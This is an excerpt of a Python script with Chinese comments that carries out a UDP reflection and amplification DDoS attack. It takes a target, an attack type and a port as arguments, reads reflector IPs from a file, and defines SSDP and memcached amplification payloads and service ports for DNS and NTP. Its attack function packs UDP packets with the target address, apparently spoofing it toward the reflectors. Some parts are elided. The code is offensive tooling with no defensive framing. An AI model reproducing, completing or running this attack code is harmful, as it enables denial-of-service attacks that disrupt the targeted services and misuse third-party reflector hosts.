...
target_dir = sys.argv[1] #攻击目标
soldier_dir = 'result.txt'#反射ip
# ddos_type = 'ssdp'#攻击类型
ddos_type = sys.argv[2] #攻击类型
attackport = sys.argv[3] #攻击端口
soldier_size = 500 #反射ip给予带宽大小,(单位/kbps)
PAYLOAD = {
	...
	'ssdp':('M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n'
		'MAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n'),
	'memcache':('\x00\x00\x00\x00\x00\x01\x00\x00get t\r\n')
}
PORT = {
	'dns': 53,
	'ntp': 123,
...
def attack(soldier,target):
	...
	udp = UDP(int(attackport), PORT[proto], payload).pack(target, soldier)
